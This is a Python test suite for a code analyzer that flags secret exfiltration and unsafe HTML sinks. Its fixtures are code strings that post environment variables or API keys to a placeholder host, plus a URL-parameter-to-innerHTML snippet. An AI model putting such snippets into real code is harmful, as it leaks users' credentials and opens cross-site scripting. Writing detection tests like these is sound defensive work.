import unittest
from main import analyze_code_product

class LaunchRegressions(unittest.TestCase):
    def test_whole_environment_request_construction_encoding_and_condition(self):
        prefix='import os\nfrom urllib.request import Request, urlopen\nr=Request("https://unknown.example", data=str(dict(os.environ)).encode())\n'
        for suffix,expected in [('',False),('urlopen(r)',True)]:
            r=self.scan(prefix+suffix)
            flows=[f for f in r['flags'] if f['pattern']=='whole_environment_egress']
            self.assertEqual(bool(flows),expected)
            if expected:self.assertEqual(flows[0]['line'],4)
        r=self.scan('import os, requests\nif requests.post("https://unknown.example",json=dict(os.environ)):\n    pass')
        self.assertEqual([f['line'] for f in r['flags'] if f['pattern']=='whole_environment_egress'],[2])
        r=self.scan('import os, requests\nrequests.post("https://unknown.example",data=str(list(os.environ.keys())).encode())')
        self.assertFalse(any(f['pattern']=='whole_environment_egress' for f in r['flags']))

    def test_both_branches_overwrite_secret_but_one_branch_preserves_it(self):
        prefix='import os, requests\nkey=os.getenv("API_KEY")\nif flag:\n    key="public"\n'
        for alternate,expected in [('else:\n    key="safe"\n',False),('',True),('else:\n    key=os.getenv("PASSWORD")\n',True)]:
            r=self.scan(prefix+alternate+'requests.post("https://unknown.example",json={"key":key})')
            self.assertEqual(any(f['pattern']=='secret_exfiltration_chain' for f in r['flags']),expected)

    def test_whole_environment_branch_overwrites_are_path_sensitive(self):
        prefix='import os, requests\npayload=dict(os.environ)\nif flag:\n    payload={"message":"public"}\n'
        for alternate,expected in [('else:\n    payload={"message":"safe"}\n',False),('',True),('else:\n    payload=dict(os.environ)\n',True)]:
            r=self.scan(prefix+alternate+'requests.post("https://unknown.example",json=payload)')
            self.assertEqual(any(f['pattern']=='whole_environment_egress' for f in r['flags']),expected)

    def scan(self, code, language='Python', intent='Review source behavior.'):
        r=analyze_code_product(intent,code,language=language)
        self.assertTrue(all(e['status']=='complete' for e in r['analysis_engines']),r['analysis_engines'])
        return r
    def test_fetch_formatting_and_trailing_code_do_not_change_risk(self):
        for code in ['async function status() { const r = await fetch("https://example.com/status"); return r.json(); }', 'async function status() {\nconst r = await fetch("https://example.com/status");\nreturn r.json();\n}']:
            r=self.scan(code,'JavaScript','Fetch public JSON over HTTPS.')
            self.assertFalse(r['flags']);self.assertFalse(r['engine_findings'])
    def test_url_html_injection_and_plain_text_pair(self):
        for sink,expected in [('innerHTML',True),('outerHTML',True),('textContent',False)]:
            r=self.scan('const name = new URLSearchParams(location.search).get("name");\ndocument.getElementById("name").'+sink+' = name;', 'JavaScript','Display a user name.')
            self.assertEqual(any(f.get('rule_id')=='javascript.url-to-html' for f in r['engine_findings']),expected)
        r=self.scan('document.getElementById("name").innerHTML = "<b>Hello</b>";', 'JavaScript','Display fixed markup.')
        self.assertFalse(r['engine_findings'])
    def test_credential_aliases_and_reassignment(self):
        for imp,call in [('import requests as r','r.post'),('from requests import post as transmit','transmit'),('import httpx as h','h.post')]:
            prefix='import os\n'+imp+'\nsecret=os.environ.get("OPENAI_API_KEY")\n'
            r=self.scan(prefix+call+'("https://unknown.example/log",json={"key":secret})')
            self.assertTrue(any(f['pattern']=='secret_exfiltration_chain' for f in r['flags']))
            r=self.scan(prefix+'secret="public"\n'+call+'("https://unknown.example/log",json={"key":secret})')
            self.assertFalse(any(f['pattern']=='secret_exfiltration_chain' for f in r['flags']))
    def test_authentication_intent_does_not_authorize_arbitrary_destinations_or_payload(self):
        prefix='import os, requests\nkey=os.getenv("OPENAI_API_KEY")\n'
        for host,kw,expected in [('api.openai.com','headers',False),('unknown.example','headers',True),('api.openai.com','json',True)]:
            r=self.scan(prefix+f'requests.post("https://{host}/v1",{kw}={{"Authorization":key}})',intent='Authenticate to OpenAI with an environment credential.')
            self.assertEqual(any(f['pattern']=='secret_exfiltration_chain' for f in r['flags']),expected)
    def test_prohibition_and_environment_wording(self):
        r=self.scan('import os, requests\nkey=os.getenv("API_KEY")\nrequests.post("https://unknown.example",json={"key":key})',intent='Build a local report. Do not transmit credentials.')
        self.assertTrue(any('conflicts with' in s for s in r['intent_mismatches']))
        self.assertFalse(any('contain secrets' in s for s in r['intent_mismatches']))

    def test_request_construction_is_not_transmission(self):
        code='import os\nfrom urllib.request import Request, urlopen\nr = Request("https://unknown.example", data=os.getenv("API_KEY").encode())\n'
        for suffix, expected in [('',False),('urlopen(r)',True)]:
            r=self.scan(code+suffix)
            self.assertEqual(any(f['pattern']=='secret_exfiltration_chain' for f in r['flags']),expected)
            if not expected:
                self.assertFalse(any(f.get('severity',0)>=18 for f in r['flags']+r['engine_findings']))

    def test_environment_names_need_credential_words(self):
        for name,expected in [('MONKEY_COUNT',False),('KEYBOARD_LAYOUT',False),('TOKENIZER_MODE',False),('APIKEY',True),('accessToken',True),('OPENAI_API_KEY',True),('PASSWORD1',True)]:
            r=self.scan(f'import os, requests\nvalue=os.getenv("{name}")\nrequests.post("https://unknown.example",json={{"value":value}})')
            self.assertEqual(any(f['pattern']=='secret_exfiltration_chain' for f in r['flags']),expected,name)

    def test_control_expressions_are_checked_once(self):
        call='requests.post("https://unknown.example",json={"key":key})'
        prefix='import os, requests\nkey=os.getenv("API_KEY")\n'
        for statement in [f'if {call}:\n    pass',f'while {call}:\n    break',f'for item in {call}:\n    pass',f'with {call} as response:\n    pass']:
            r=self.scan(prefix+statement)
            flows=[f for f in r['flags'] if f['pattern']=='secret_exfiltration_chain']
            self.assertEqual(len(flows),1,statement)
            self.assertEqual(flows[0]['line'],3)
